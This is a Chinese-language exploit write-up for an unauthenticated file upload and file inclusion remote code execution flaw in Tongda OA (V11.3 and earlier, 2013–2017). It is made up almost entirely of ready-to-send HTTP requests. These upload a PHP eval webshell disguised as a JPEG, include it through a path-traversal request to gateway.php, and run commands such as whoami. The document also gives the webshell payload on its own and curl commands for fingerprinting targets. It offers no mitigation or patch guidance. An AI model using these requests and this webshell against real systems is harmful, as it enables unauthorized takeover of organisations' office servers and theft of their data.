## 漏洞描述

通达OA 多个版本存在前台未授权文件上传漏洞，攻击者可以上传恶意文件，然后利用文件包含漏洞执行上传的文件，实现远程代码执行。

## 影响版本

- V11.3, V11.2, V11.1
- 2017, 2016, 2015, 2013

## 前置条件

- 无需认证
- 通达OA默认安装配置

## 利用步骤

### Step 1: 未授权文件上传

```http
POST /ispirit/im/upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundary
Content-Disposition: form-data; name="P"

123
------WebKitFormBoundary
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="ATTACHMENT"; filename="shell.jpg"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundary--
```

响应返回上传路径: `{"status":1,"content":"im/2026/shell.jpg"}`

### Step 2: 文件包含执行

```http
POST /ispirit/interface/gateway.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../attach/im/2026/shell.jpg"}
```

### Step 3: 执行命令

```http
POST /ispirit/interface/gateway.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../attach/im/2026/shell.jpg"}&cmd=whoami
```

## Payload

```php
# 上传的webshell内容
<?php @eval($_POST['cmd']);?>
```

## 指纹确认

```bash
# 通达OA 特征
curl -s http://target/ | grep -i "office anywhere\|通达\|MYOA"
curl -s http://target/inc/expired.php  # 版本信息
```

## 验证方法

上传文件后通过文件包含访问，确认命令执行结果。
